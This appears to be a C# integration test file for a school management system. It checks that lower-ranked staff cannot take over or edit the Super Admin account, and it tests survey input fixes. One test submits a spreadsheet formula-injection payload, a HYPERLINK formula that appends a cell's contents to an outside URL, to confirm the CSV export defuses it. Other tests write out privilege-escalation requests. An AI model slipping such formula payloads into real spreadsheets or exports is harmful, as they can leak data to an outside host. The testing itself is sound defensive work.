using System.Net;
using System.Net.Http.Json;
using System.Text.Json;
using Microsoft.EntityFrameworkCore;
using SENGENSystem.Server.Domain;
using SENGENSystem.Server.Features.Survey;
using static SENGENSystem.Server.Tests.Integration.EnlistmentScenario;

namespace SENGENSystem.Server.Tests.Integration
{
    /// <summary>
    /// The Super Admin slice, walked for the first time in pass 15. Every user-management guard
    /// protected the School Admin and none the Super Admin above it, so an Academic Head could take
    /// the top account over three different ways, or simply promote themselves into it. These pin
    /// the single rank rule (AccountAuthority) from each side, plus the survey fixes found in the
    /// same walk.
    /// </summary>
    [Collection(AppCollection.Name)]
    public class AccountAuthorityTests(SengenAppFactory app)
    {
        private const string AcademicHead = "academichead@stialaminos.local";
        private const string SchoolAdmin = "admin@stialaminos.local";
        private const string SchoolAdminPassword = "Admin@Sengen2026";
        private const string SuperAdmin = "superadmin@stialaminos.local";
        private const string SuperAdminPassword = SengenAppFactory.SuperAdminPassword;

        private async Task<(Guid Id, string Hash, string Email, bool Active, UserRole Role)> UserAsync(string email)
        {
            await using var scope = app.Scope(out var db);
            var u = await db.Users.AsNoTracking().SingleAsync(x => x.Email == email);
            return (u.Id, u.PasswordHash, u.Email, u.IsActive, u.Role);
        }

        [SqlFact]
        public async Task An_academic_head_cannot_reset_edit_or_deactivate_the_super_admin()
        {
            var target = await UserAsync(SuperAdmin);
            var head = await app.SignedInAsync(AcademicHead, StaffPassword);

            var reset = await head.PostAsJsonAsync($"/api/users/{target.Id}/password", new { newPassword = "Takeover2026" });
            var edit = await head.PutAsJsonAsync($"/api/users/{target.Id}",
                new { firstName = "Super", lastName = "Admin", email = "attacker@example.test", role = "SuperAdmin" });
            var deactivate = await head.PostAsJsonAsync($"/api/users/{target.Id}/active", new { isActive = false });

            Assert.Equal(HttpStatusCode.Forbidden, reset.StatusCode);
            Assert.Equal(HttpStatusCode.Forbidden, edit.StatusCode);
            Assert.Equal(HttpStatusCode.Forbidden, deactivate.StatusCode);

            var after = await UserAsync(SuperAdmin);
            Assert.Equal(target.Hash, after.Hash);
            Assert.Equal(target.Email, after.Email);
            Assert.True(after.Active);
        }

        [SqlFact]
        public async Task An_academic_head_cannot_promote_themselves_to_super_admin_or_school_admin()
        {
            var self = await UserAsync(AcademicHead);
            var head = await app.SignedInAsync(AcademicHead, StaffPassword);

            foreach (var role in new[] { "SuperAdmin", "SchoolAdmin" })
            {
                var response = await head.PutAsJsonAsync($"/api/users/{self.Id}",
                    new { firstName = "Academic", lastName = "Head", email = AcademicHead, role });
                Assert.Equal(HttpStatusCode.Forbidden, response.StatusCode);
            }
            Assert.Equal(UserRole.AcademicHead, (await UserAsync(AcademicHead)).Role);
        }

        [SqlFact]
        public async Task A_school_admin_cannot_reset_the_super_admins_password()
        {
            var target = await UserAsync(SuperAdmin);
            var admin = await app.SignedInAsync(SchoolAdmin, SchoolAdminPassword);

            var reset = await admin.PostAsJsonAsync($"/api/users/{target.Id}/password", new { newPassword = "Takeover2026" });

            Assert.Equal(HttpStatusCode.Forbidden, reset.StatusCode);
            Assert.Equal(target.Hash, (await UserAsync(SuperAdmin)).Hash);
        }

        [SqlFact]
        public async Task The_super_admin_manages_other_accounts()
        {
            var (_, email) = await new EnlistmentScenario(app).StudentAsync(await new EnlistmentScenario(app).ActiveTermAsync());
            var student = await UserAsync(email);
            var super = await app.SignedInAsync(SuperAdmin, SuperAdminPassword);

            var reset = await super.PostAsJsonAsync($"/api/users/{student.Id}/password", new { newPassword = "Reset2026ok" });

            Assert.Equal(HttpStatusCode.OK, reset.StatusCode);
        }

        [SqlFact]
        public async Task User_management_is_super_admin_only()
        {
            // School Admin and Academic Head no longer reach any user-management endpoint,
            // not even for accounts below them.
            var (_, email) = await new EnlistmentScenario(app).StudentAsync(await new EnlistmentScenario(app).ActiveTermAsync());
            var student = await UserAsync(email);

            foreach (var client in new[]
                     {
                         await app.SignedInAsync(SchoolAdmin, SchoolAdminPassword),
                         await app.SignedInAsync(AcademicHead, StaffPassword)
                     })
            {
                Assert.Equal(HttpStatusCode.Forbidden, (await client.GetAsync("/api/users")).StatusCode);
                Assert.Equal(HttpStatusCode.Forbidden, (await client.PostAsJsonAsync("/api/users",
                    new { firstName = "New", lastName = "Staff", email = "new.staff@example.test", role = "Registrar", password = "Staff2026ok" })).StatusCode);
                Assert.Equal(HttpStatusCode.Forbidden, (await client.PostAsJsonAsync(
                    $"/api/users/{student.Id}/password", new { newPassword = "Reset2026ok" })).StatusCode);
                Assert.Equal(HttpStatusCode.Forbidden, (await client.PostAsJsonAsync(
                    $"/api/users/{student.Id}/active", new { isActive = false })).StatusCode);
            }

            var after = await UserAsync(email);
            Assert.Equal(student.Hash, after.Hash);
            Assert.True(after.Active);
        }

        [SqlFact]
        public async Task The_last_super_admin_cannot_demote_themselves()
        {
            var self = await UserAsync(SuperAdmin);
            var super = await app.SignedInAsync(SuperAdmin, SuperAdminPassword);

            var response = await super.PutAsJsonAsync($"/api/users/{self.Id}",
                new { firstName = "Super", lastName = "Admin", email = SuperAdmin, role = "SchoolAdmin" });

            Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
            Assert.Equal(UserRole.SuperAdmin, (await UserAsync(SuperAdmin)).Role);
        }

        [SqlFact]
        public async Task A_must_change_password_account_reaches_only_the_password_change_until_it_does()
        {
            // The flag used to be honoured by the client's first-login screen alone; the same
            // token could call anything directly. Now the server refuses everything else.
            var scenario = new EnlistmentScenario(app);
            var (student, email) = await scenario.StudentAsync(await scenario.ActiveTermAsync());
            await using (var scope = app.Scope(out var db))
            {
                (await db.Users.SingleAsync(u => u.Id == student.UserId)).MustChangePassword = true;
                await db.SaveChangesAsync();
            }
            var client = await app.SignedInAsync(email, StudentPassword);

            Assert.Equal(HttpStatusCode.Forbidden, (await client.GetAsync("/api/enlistment/mine")).StatusCode);
            Assert.Equal(HttpStatusCode.OK, (await client.GetAsync("/api/auth/me")).StatusCode);

            var change = await client.PutAsJsonAsync("/api/profile/password",
                new { currentPassword = StudentPassword, newPassword = "Changed2026ok", confirmPassword = "Changed2026ok" });
            Assert.True(change.IsSuccessStatusCode, $"{(int)change.StatusCode}: {await change.Content.ReadAsStringAsync()}");

            // Same token, now allowed: the gate reads the account, not a claim frozen at sign-in.
            Assert.Equal(HttpStatusCode.OK, (await client.GetAsync("/api/enlistment/mine")).StatusCode);
        }

        // ---- The survey, end to end ----

        private async Task<HttpClient> InvitedRespondentAsync()
        {
            var scenario = new EnlistmentScenario(app);
            var (student, email) = await scenario.StudentAsync(await scenario.ActiveTermAsync());
            var super = await app.SignedInAsync(SuperAdmin, SuperAdminPassword);
            (await super.PostAsJsonAsync("/api/admin/survey/collection", new { isOpen = true })).EnsureSuccessStatusCode();
            (await super.PostAsJsonAsync("/api/admin/survey/invitations",
                new { userIds = new[] { student.UserId }, pushNotification = false, sendEmail = false })).EnsureSuccessStatusCode();
            return await app.SignedInAsync(email, StudentPassword);
        }

        private static object Answers(string? suggestions = null) => new
        {
            respondentName = "Test Respondent",
            answers = SurveyContent.AllQuestionKeys().ToDictionary(k => k, _ => 4),
            suggestions
        };

        [SqlFact]
        public async Task An_over_long_survey_answer_is_a_validation_error_not_a_500()
        {
            var respondent = await InvitedRespondentAsync();

            var response = await respondent.PostAsJsonAsync("/api/survey/mine", Answers(new string('x', 5000)));

            Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
            Assert.Contains("suggestions", await response.Content.ReadAsStringAsync());
        }

        [SqlFact]
        public async Task Two_simultaneous_submissions_record_one_response_and_answer_the_other_cleanly()
        {
            var respondent = await InvitedRespondentAsync();

            var responses = await Task.WhenAll(
                respondent.PostAsJsonAsync("/api/survey/mine", Answers()),
                respondent.PostAsJsonAsync("/api/survey/mine", Answers()));

            Assert.Contains(responses, r => r.StatusCode == HttpStatusCode.OK);
            Assert.DoesNotContain(responses, r => r.StatusCode == HttpStatusCode.InternalServerError);
        }

        [SqlFact]
        public async Task The_results_export_defuses_a_formula_typed_into_a_comment()
        {
            var respondent = await InvitedRespondentAsync();
            const string payload = "=HYPERLINK(\"http://example.test/?\"&A1,\"click\")";
            (await respondent.PostAsJsonAsync("/api/survey/mine", Answers(payload))).EnsureSuccessStatusCode();

            var super = await app.SignedInAsync(SuperAdmin, SuperAdminPassword);
            var csv = await super.GetStringAsync("/api/admin/survey/results/export");

            Assert.DoesNotContain(",\"=HYPERLINK", csv);
            Assert.Contains("'=HYPERLINK", csv);
        }
    }
}
